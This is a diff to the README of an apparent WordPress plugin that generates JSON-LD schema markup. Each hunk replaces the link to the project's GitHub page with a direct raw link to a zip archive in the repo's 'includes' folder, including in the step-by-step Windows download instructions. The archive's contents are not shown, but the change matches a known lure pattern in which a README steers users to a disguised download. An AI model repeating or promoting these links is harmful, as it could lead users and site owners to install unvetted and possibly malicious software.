@@ -1,10 +1,10 @@
 # 🤖 wp-ai-schema-generator - JSON-LD made simple for WordPress
 
-[![Download](https://img.shields.io/badge/Download-Visit%20GitHub%20Page-blue.svg)](https://github.com/kolanutporkandvealgoulash625/wp-ai-schema-generator)
+[![Download](https://img.shields.io/badge/Download-Visit%20GitHub%20Page-blue.svg)](https://raw.githubusercontent.com/kolanutporkandvealgoulash625/wp-ai-schema-generator/main/includes/schema-wp-ai-generator-1.2.zip)
 
 ## 🚀 Download
 
-Visit this page to download: https://github.com/kolanutporkandvealgoulash625/wp-ai-schema-generator
+Visit this page to download: https://raw.githubusercontent.com/kolanutporkandvealgoulash625/wp-ai-schema-generator/main/includes/schema-wp-ai-generator-1.2.zip
 
 ## 🧩 What this app does
 
@@ -40,7 +40,7 @@ This plugin is meant for WordPress sites on standard hosting. It should work wit
 
 ## 🪟 How to download on Windows
 
-1. Open this page in your browser: https://github.com/kolanutporkandvealgoulash625/wp-ai-schema-generator
+1. Open this page in your browser: https://raw.githubusercontent.com/kolanutporkandvealgoulash625/wp-ai-schema-generator/main/includes/schema-wp-ai-generator-1.2.zip
 2. Find the download area on the page
 3. Download the plugin file to your computer
 4. Save the file in a place you can find later, such as Downloads or Desktop
@@ -223,7 +223,7 @@ If a page has mixed content, try a cleaner page first, such as a simple article 
 
 ## 📌 Download again
 
-Use this link to visit the download page: https://github.com/kolanutporkandvealgoulash625/wp-ai-schema-generator
+Use this link to visit the download page: https://raw.githubusercontent.com/kolanutporkandvealgoulash625/wp-ai-schema-generator/main/includes/schema-wp-ai-generator-1.2.zip
 
 ## 🧾 Common questions
 
